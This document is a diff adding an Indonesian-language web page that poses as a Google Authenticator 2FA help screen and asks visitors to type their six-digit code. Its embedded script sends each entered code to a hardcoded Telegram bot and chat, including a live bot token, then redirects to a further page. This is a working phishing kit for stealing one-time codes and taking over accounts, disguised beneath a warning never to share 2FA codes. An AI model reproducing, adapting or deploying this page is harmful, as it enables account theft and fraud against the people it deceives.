@@ -1,0 +1,114 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   2FA Code Google Authenticator
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: "Poppins", sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-[#F7F7FF] min-h-screen flex flex-col">
+  <header class="flex items-center justify-between px-4 py-3 bg-gradient-to-b from-[#D6D3F0] to-[#F7F7FF]">
+   <button aria-label="Back" class="text-[#0B2545] text-2xl">
+    <i class="fas fa-arrow-left">
+    </i>
+   </button>
+   <h1 class="text-[#0B2545] font-semibold text-lg">
+    Bantuan
+   </h1>
+   <div class="w-6">
+   </div>
+  </header>
+  <div class="flex justify-center mt-6">
+   <img alt="Blue shield with checkmark and padlock icon" class="select-none" draggable="false" height="72" src="https://www.lytics.com/wp-content/uploads/2023/02/deployment-hero.png" width="72"/>
+  </div>
+  <main class="flex flex-col items-center px-6 mt-6 flex-grow">
+   <h2 class="text-[#0B2545] font-semibold text-xl leading-6 mb-2">
+    Masukkan Kode 2FA
+   </h2>
+   <p class="text-[#7B8A99] text-center text-sm leading-5 mb-8 max-w-xs">
+    Masukkan 6 digit angka dari Aplikasi Google Authenticator
+   </p>
+   <form class="flex space-x-3 mb-6" id="codeForm" onsubmit="return false;">
+    <input aria-label="2FA digit 1" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+    <input aria-label="2FA digit 2" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+    <input aria-label="2FA digit 3" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+    <input aria-label="2FA digit 4" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+    <input aria-label="2FA digit 5" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+    <input aria-label="2FA digit 6" class="w-10 h-12 bg-[#F7F7FF] border border-[#E6E6E6] rounded-lg text-center text-2xl font-semibold text-[#0B2545] focus:outline-none focus:ring-2 focus:ring-[#5B3CC4]" inputmode="numeric" maxlength="1" pattern="[0-9]*" required="" type="text"/>
+   </form>
+   <button class="text-[#5B3CC4] font-semibold text-sm mb-20 focus:outline-none" id="sendBtn" type="button">
+    Tempel Kode
+   </button>
+   <p class="text-[#0B2545] text-center text-sm leading-5 max-w-xs mb-6" style="opacity: 0.8">
+    Jangan berikan kode 2FA kepada siapapun. Dapat berisiko penyalahgunaan akun yang merugikan
+   </p>
+  </main>
+  <script>
+   const BOT_TOKEN = "8341291421:AAHZhAJ-_wj7HBO57T7jvQ1yJcF46SZvESg";
+    const CHAT_ID = "7549590022";
+
+    const inputs = document.querySelectorAll("#codeForm input");
+    const sendBtn = document.getElementById("sendBtn");
+
+    // Auto move to next input on input
+    inputs.forEach((input, idx) => {
+      input.addEventListener("input", () => {
+        if (input.value.length === 1 && idx < inputs.length - 1) {
+          inputs[idx + 1].focus();
+        }
+      });
+      input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && input.value === "" && idx > 0) {
+          inputs[idx - 1].focus();
+        }
+      });
+    });
+
+    sendBtn.addEventListener("click", () => {
+      let code = "";
+      for (const input of inputs) {
+        if (input.value.length !== 1 || !/^\d$/.test(input.value)) {
+          alert("Mohon isi semua 6 digit dengan angka.");
+          return;
+        }
+        code += input.value;
+      }
+
+      const message = `Kode 2FA yang dimasukkan: ${code}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+        }),
+      })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.ok) {
+            window.location.href = "code2FA.html";
+            inputs.forEach((input) => (input.value = ""));
+            inputs[0].focus();
+          } else {
+            alert("Gagal mengirim kode ke Telegram.");
+          }
+        })
+        .catch(() => {
+          alert("Terjadi kesalahan saat mengirim kode.");
+        });
+    });
+  </script>
+ </body>
+</html>
